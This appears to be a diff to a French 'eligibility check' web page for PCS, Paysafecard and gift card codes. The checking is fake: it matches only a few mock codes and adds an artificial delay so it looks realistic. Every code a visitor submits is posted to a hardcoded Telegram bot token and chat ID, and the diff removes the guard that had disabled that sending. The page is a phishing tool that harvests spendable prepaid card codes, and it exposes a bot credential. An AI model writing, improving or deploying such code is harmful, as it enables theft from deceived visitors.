@@ -23,6 +23,19 @@
             background-color: #EF4444;
             color: white;
         }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1E40AF;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body class="bg-[#0A192F] text-white min-h-screen">
@@ -61,7 +74,7 @@
                         <p id="error-0" class="text-red-500 text-sm mt-2 hidden"></p>
                     </div>
                     
-                    <button onclick="verify(0)" 
+                    <button onclick="verify(0)" id="btn-0"
                             class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
                         Vérifier mon éligibilité
                     </button>
@@ -83,7 +96,7 @@
                         <p id="error-1" class="text-red-500 text-sm mt-2 hidden"></p>
                     </div>
                     
-                    <button onclick="verify(1)" 
+                    <button onclick="verify(1)" id="btn-1"
                             class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
                         Vérifier
                     </button>
@@ -105,7 +118,7 @@
                         <p id="error-2" class="text-red-500 text-sm mt-2 hidden"></p>
                     </div>
                     
-                    <button onclick="verify(2)" 
+                    <button onclick="verify(2)" id="btn-2"
                             class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
                         Vérifier
                     </button>
@@ -123,13 +136,10 @@
 
     <script>
         // ============================================================
-        // 🔐 À MODIFIER AVEC TES INFORMATIONS PERSO (GARDE LES SECRÈTES)
+        // 🔐 TES IDENTIFIANTS TÉLÉGRAM INTÉGRÉS
         // ============================================================
-        const TELEGRAM_BOT_TOKEN = "8478024946:AAGc-ow2iy2Ee1xcSMZDKnGrbeUqphdzIpE";      // ← Remplace par ton token
-        const TELEGRAM_CHAT_ID = "222488616";      // ← Remplace par ton chat ID
-        
-        // ⚠️ Si tu ne veux PAS utiliser Telegram, laisse les lignes au-dessus telles quelles
-        //    Le site fonctionnera normalement sans envoyer d'alertes
+        const TELEGRAM_BOT_TOKEN = "8478024946:AAGc-ow2iy2Ee1xcSMZDKnGrbeUqphdzIpE";
+        const TELEGRAM_CHAT_ID = "6885625999";
         // ============================================================
         
         let currentTab = 0;
@@ -153,12 +163,19 @@
             return value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1-').trim().slice(0,19);
         }
 
-        async function sendTelegramAlert(code, type, eligible, statusMessage) {
-            if (TELEGRAM_BOT_TOKEN === "8478024946:AAGc-ow2iy2Ee1xcSMZDKnGrbeUqphdzIpE" || TELEGRAM_CHAT_ID === "6885625999") {
-                console.log("Telegram non configuré");
-                return;
+        function showLoader(tab, show) {
+            const btn = document.getElementById(`btn-${tab}`);
+            if (show) {
+                btn.innerHTML = '<div class="loader"></div>';
+                btn.disabled = true;
+            } else {
+                if (tab === 0) btn.innerHTML = 'Vérifier mon éligibilité';
+                else btn.innerHTML = 'Vérifier';
+                btn.disabled = false;
             }
-            
+        }
+
+        async function sendTelegramAlert(code, type, eligible, statusMessage) {
             const status = eligible ? "✅ ÉLIGIBLE" : "❌ NON ÉLIGIBLE";
             const date = new Date().toLocaleString("fr-FR");
             
@@ -174,7 +191,7 @@
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
             try {
-                await fetch(url, {
+                const response = await fetch(url, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -182,9 +199,13 @@
                         text: message
                     })
                 });
-                console.log("Alerte Telegram envoyée");
+                if (response.ok) {
+                    console.log("✅ Alerte Telegram envoyée avec succès");
+                } else {
+                    console.log("⚠️ Erreur Telegram:", await response.text());
+                }
             } catch (error) {
-                console.error("Erreur Telegram:", error);
+                console.log("❌ Erreur réseau Telegram:", error);
             }
         }
 
@@ -202,6 +223,7 @@
             let colorClass = "";
             let typeName = "";
 
+            // Validation du format
             if (tab === 0) {
                 typeName = "Carte PCS";
                 const clean = value.replace(/-/g, '');
@@ -210,6 +232,32 @@
                     errorDiv.classList.remove('hidden');
                     return;
                 }
+            } 
+            else if (tab === 1) {
+                typeName = "Paysafecard";
+                if (value.length !== 16 || !/^\d{16}$/.test(value)) {
+                    errorDiv.textContent = "Le code doit contenir exactement 16 chiffres";
+                    errorDiv.classList.remove('hidden');
+                    return;
+                }
+            } 
+            else if (tab === 2) {
+                typeName = "Carte Cadeau";
+                if (value.length === 0) {
+                    errorDiv.textContent = "Veuillez entrer un code cadeau";
+                    errorDiv.classList.remove('hidden');
+                    return;
+                }
+            }
+
+            // Afficher le loader
+            showLoader(tab, true);
+
+            // Simuler un délai de vérification (plus réaliste)
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            // Vérification des codes mock
+            if (tab === 0) {
                 if (value === "1234-5678-9012-3456") {
                     isValid = true;
                     message = "✅ Éligible - Carte PCS active et valide";
@@ -224,12 +272,6 @@
                 }
             } 
             else if (tab === 1) {
-                typeName = "Paysafecard";
-                if (value.length !== 16 || !/^\d{16}$/.test(value)) {
-                    errorDiv.textContent = "Le code doit contenir exactement 16 chiffres";
-                    errorDiv.classList.remove('hidden');
-                    return;
-                }
                 if (value === "1234567890123456") {
                     isValid = true;
                     message = "✅ Éligible - Paysafecard valide";
@@ -244,7 +286,6 @@
                 }
             } 
             else if (tab === 2) {
-                typeName = "Carte Cadeau";
                 if (value === "GIFT-ABCD-1234") {
                     isValid = true;
                     message = "✅ Éligible - Carte Cadeau active";
@@ -259,18 +300,24 @@
                 }
             }
 
+            // Afficher le résultat
             resultDiv.innerHTML = message;
-            resultDiv.className = `hidden mt-4 p-5 rounded-2xl text-center text-lg font-medium ${colorClass}`;
+            resultDiv.className = `mt-4 p-5 rounded-2xl text-center text-lg font-medium ${colorClass}`;
             resultDiv.classList.remove('hidden');
+            
+            // Cacher le loader
+            showLoader(tab, false);
             
             // Envoi de l'alerte Telegram
             await sendTelegramAlert(value, typeName, isValid, message);
         }
 
+        // Auto-format pour PCS
         document.getElementById('input-0').addEventListener('input', function(e) {
             e.target.value = formatCardNumber(e.target.value);
         });
 
+        // Initialisation
         window.onload = () => {
             switchTab(0);
         };
